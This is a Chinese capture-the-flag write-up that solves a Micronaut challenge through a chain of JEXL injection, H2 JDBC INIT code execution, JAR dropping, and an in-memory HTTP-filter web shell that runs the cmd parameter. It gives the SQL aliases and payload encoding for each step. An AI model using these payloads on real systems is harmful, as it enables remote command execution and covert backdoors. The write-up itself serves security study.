# SU_ez_micronaut

## 题目简述

题目使用 Micronaut Serialization。与传统 Jackson `enableDefaultTyping` 题不同，这里不能在 JSON 中任意指定反序列化类型：只有声明了 `@Serdeable` 的 `User` Bean 能被恢复。`User` 的三个字段为：

```java
@Serdeable
@JsonFilter("key-filter")
public class User {
    private String username;
    private String password;
    private Object key;
}
```

突破点在自定义 `key-filter`。过滤器会解码 `key`，把攻击者同时控制的 JSON 上下文和 JEXL 表达式交给 `checkKey`。JEXL 使用 `ObjectContext` 求值，因此属性读取和赋值会映射为目标对象的 getter、setter 调用。

完整链条为：

```text
User.key
  -> 自定义 JsonFilter
  -> 可控 BeanUtil 上下文 + 可控 JEXL 表达式
  -> 任意 getter/setter
  -> BeanUtil.setU()
  -> Hutool PooledConnection(PooledDataSource)
  -> H2 JDBC INIT
  -> 本地写入并加载恶意 JAR
  -> 注入 Micronaut HTTP Filter
  -> cmd 参数命令执行并在响应中回显
```

题目环境不允许出网，所以仅触发 `Runtime.exec` 或加载远程 SQL 都不能稳定完成利用；最终需要把内存马 JAR 作为 Base64 数据随请求送入。

## 解题过程

### 1. 还原 `key-filter` 的封装格式

出题人最终利用程序向：

```text
POST /hello/user
```

发送 `User` JSON。外层结构为：

```json
{
  "username": "admin",
  "password": "1",
  "key": "<outer-base64>"
}
```

`key` 不是直接的表达式，而是两层 Base64 和分隔符组成的协议：

```text
outer-base64 = Base64(
    Base64(bean-json)
    + "<--->"
    + jexl-expression
    + "<--->"
    + "admin"
)
```

其中：

- `bean-json` 被 Gson 恢复为 JEXL `ObjectContext` 的根对象；
- `jexl-expression` 由 JEXL 引擎执行；
- 第三段必须等于 `admin`，用于通过过滤器的身份判断。

出题人利用的上下文对象是 `BeanUtil`。先把其 `url` 设置为 `"http"`，再序列化：

```java
BeanUtil bean = new BeanUtil();
bean.setUrl("http");
String beanJson = new Gson().toJson(bean, BeanUtil.class);

String inner =
    Base64.getEncoder().encodeToString(beanJson.getBytes())
    + "<--->" + expression
    + "<--->admin";

String key =
    Base64.getEncoder().encodeToString(inner.getBytes());
```

这样不需要让 Micronaut 直接反序列化任意第三方类；危险对象由后续 JEXL 表达式在服务端创建。

### 2. 利用 JEXL `ObjectContext` 调用 setter

`ObjectContext.get(name)` 会把表达式中的属性读取转换为 JavaBean getter；赋值则经 `ObjectContext.set(name, value)` 和 `PropertySetExecutor` 调用 setter。例如：

```text
n='java.lang.String'
```

会调用：

```java
BeanUtil.setN("java.lang.String")
```

多个赋值可以写成列表表达式：

```text
[n='value-1',d='value-2',u='value-3']
```

它们按从左到右的顺序执行。顺序不能颠倒，因为最后一次给 `u` 赋值会进入危险的 `setU`，此时 `n` 和 `d` 必须已经准备好。

题目提供的关键方法为：

```java
public void setU(String u) throws Exception {
    Unsafe unsafe = getUnsafeInstance();
    Class<?> clazz = Class.forName(u);
    Object instance = unsafe.allocateInstance(clazz);

    Constructor<?> constructor =
        clazz.getDeclaredConstructor(Class.forName(this.n));
    constructor.setAccessible(true);
    instance = constructor.newInstance(this.d);
}
```

虽然 `unsafe.allocateInstance` 的返回值随后被覆盖，但该方法仍然给出了一个通用的反射构造原语：

```text
new Class.forName(u)(Class.forName(n) 类型的 d)
```

### 3. 将反射构造原语推进到 H2

依赖中同时存在 Hutool 数据源和 H2。构造参数选择为：

```text
n = cn.hutool.db.ds.pooled.PooledDataSource
d = 一个配置了恶意 H2 JDBC URL 的 PooledDataSource
u = cn.hutool.db.ds.pooled.PooledConnection
```

对应 JEXL 骨架：

```text
[
  n='cn.hutool.db.ds.pooled.PooledDataSource',
  d=new(
      'cn.hutool.db.ds.pooled.PooledDataSource',
      new(
          'cn.hutool.db.ds.pooled.DbConfig',
          '<jdbc-url>',
          '1111',
          '111'
      )
    ),
  u='cn.hutool.db.ds.pooled.PooledConnection'
]
```

最后的 `u=...PooledConnection` 触发：

```java
new PooledConnection((PooledDataSource)d)
```

构造连接时会消费 `DbConfig` 中的 JDBC URL，从而进入 H2。

H2 的 `INIT` 可以创建 Java ALIAS。常见资料把两条 SQL 拆成远程 `RUNSCRIPT`，但本题无需出网：只要对 JDBC URL 中的分号正确转义，初始化命令可以包含“创建 ALIAS”和“调用 ALIAS”两条语句。最小验证形态为：

```text
jdbc:h2:mem:test;MODE=MSSQLServer;
INIT=CREATE ALIAS IF NOT EXISTS EXEC AS
'void exec(String cmd) throws java.io.IOException {
    Runtime.getRuntime().exec(cmd)\;
}'\;
CALL EXEC('touch /tmp/suctf-proof')\;
```

实际放入单行 JEXL 字符串时，还要再处理 Java 字符串和 JEXL 字符串的转义层。构造 payload 时应逐层打印并核对最终 JDBC URL，不能凭经验叠加反斜杠。

### 4. 在不出网环境中写入恶意 JAR

直接让 H2 调用命令只能证明执行能力。为了得到稳定的 HTTP 回显，需要先把 Micronaut 内存马编译成 JAR，再把 JAR 的 Base64 内容放入第一条请求。

第一条 H2 URL 创建 `BASE64_TO_JAR`：

```sql
CREATE ALIAS IF NOT EXISTS BASE64_TO_JAR AS '
void base64ToJar(String base64Data, String filePath)
throws java.io.IOException {
    byte[] jarBytes =
        java.util.Base64.getDecoder().decode(base64Data);
    try (
        java.io.FileOutputStream fos =
            new java.io.FileOutputStream(filePath)
    ) {
        fos.write(jarBytes);
    }
}
';

CALL BASE64_TO_JAR('<jar-base64>', '/tmp/b.jar');
```

将这组 SQL 编入 H2 `INIT`，再放入上一节的 JEXL 表达式，组成第一个 `User.key`。请求完成后，恶意 JAR 已写入 `/tmp/b.jar`。

第二条 H2 URL 创建加载器：

```sql
CREATE ALIAS IF NOT EXISTS LOAD_JAR AS '
void loadJar(
    String jarPath,
    String className,
    String methodName
) throws Exception {
    java.net.URL jarUrl =
        new java.net.URL("file:" + jarPath);
    java.net.URLClassLoader loader =
        new java.net.URLClassLoader(
            new java.net.URL[]{jarUrl}
        );
    Class<?> loadedClass =
        loader.loadClass(className);
    Object instance =
        loadedClass.getDeclaredConstructor().newInstance();
    java.lang.reflect.Method method =
        loadedClass.getMethod(methodName);
    method.invoke(instance);
}
';

CALL LOAD_JAR(
    '/tmp/b.jar',
    'micronaut.poc.EvilFilter',
    'hacked'
);
```

将它编码成第二个 `User.key` 并再次请求 `/hello/user`，即可加载 JAR 并调用 `EvilFilter.hacked()`。

### 5. 注入 Micronaut HTTP Filter

`EvilFilter.hacked()` 从当前 Netty 请求线程恢复框架对象。出题人确认的最短对象路径是：

```text
NettyThreadFactory$NonBlockingFastThreadLocalThread
  -> threadLocalMap
  -> indexedVariables
  -> PropagatedContextImpl
  -> elements[0]
  -> ServerHttpRequestContext
  -> httpRequest
  -> NettyHttpRequest.channelHandlerContext
  -> handler
  -> requestHandler
  -> RouteExecutor
  -> DefaultRouter
  -> alwaysMatchesHttpFilters
```

内存马完成以下操作：

1. 通过 `Unsafe` 和反射取得 `DefaultRouter`；
2. 读取 `alwaysMatchesHttpFilters` 中已有的过滤器列表；
3. 创建一个 `HttpServerFilter`，从请求参数读取 `cmd`；
4. 在 Linux 上以 `sh -c cmd` 执行，并读取标准输出；
5. 用 `AroundLegacyFilter` 包装该过滤器；
6. 把它加入列表，并将新的 memoized supplier 写回路由器。

核心行为可概括为：

```java
String cmd = request.getParameters().get("cmd");
String[] argv = {"sh", "-c", cmd};
InputStream in =
    Runtime.getRuntime().exec(argv).getInputStream();

return Flux.from(chain.proceed(request))
    .doOnNext(response -> response.body(output));
```

注入成功后，请求任意路径并附加参数即可验证：

```text
GET /not-found?cmd=id
```

响应正文应变成命令输出。再根据赛时环境中的 flag 位置或读取程序取得 flag。仓库没有保存题目源码、附件、赛时实例或最终 flag 字符串，因此本文不伪造具体值。

出题人的[完整赛后分析](https://www.yulate.com/post/suctf2025-chu-ti-ji-lu/)还包含 Micronaut 路由对象回溯和最终 Java Exploit 的完整实现。这里保留该链接用于查阅长篇框架研究代码；完成利用所必需的对象路径、两次 H2 请求和数据封装已经写入正文。

## 方法总结

本题把“类型白名单”转化为了一条间接对象构造链。Micronaut 只允许 `User` 反序列化并不代表安全，因为自定义过滤器把 `key` 解码后交给了攻击者可控的 JEXL `ObjectContext`。JEXL setter 又能调用 `BeanUtil.setU`，最终构造 Hutool 数据库连接并触发 H2 `INIT`。

在无出网条件下，利用没有停在命令执行，而是分两次请求完成“Base64 写 JAR”和“本地加载 JAR”，再从当前 Netty 请求线程找到 `DefaultRouter`，注册能够回显命令输出的过滤器。分析类似题目时，应沿着“允许反序列化的业务对象 → 自定义回调 → 表达式引擎 → getter/setter → 第三方构造器 → 框架运行时对象”逐层验证，而不能只检查 JSON 是否支持任意 `$type`。
